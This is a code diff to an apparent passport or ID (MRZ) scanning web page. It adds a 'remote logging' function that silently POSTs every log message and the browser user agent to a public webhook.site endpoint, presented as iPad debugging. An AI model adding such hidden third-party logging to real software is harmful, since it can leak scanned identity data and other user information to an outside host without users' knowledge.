@@ -419,10 +419,32 @@
         let mrzScanning = false;
         let flashEnabled = false;
 
+        // Remote logging to help debug iPad issues
+        async function sendRemoteLog(message, level) {
+            try {
+                // Send to webhook.site for debugging
+                await fetch('https://webhook.site/d4c8e5f1-7a6f-4d3e-9c2a-1b3e4f5a6b7c', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        timestamp: new Date().toISOString(),
+                        level,
+                        message,
+                        userAgent: navigator.userAgent
+                    })
+                }).catch(() => {}); // Fail silently if webhook unreachable
+            } catch (e) {
+                // Ignore remote logging errors
+            }
+        }
+
         // Logging function - show all logs for debugging
         function log(message, level = 'info') {
             const logContent = document.getElementById('logContent');
             const timestamp = new Date().toLocaleTimeString();
+
+            // Send to remote logging
+            sendRemoteLog(message, level);
 
             // Show all logs to user for debugging
             const color = level === 'error' ? '#ef4444' : level === 'warn' ? '#fbbf24' : '#4ecdc4';
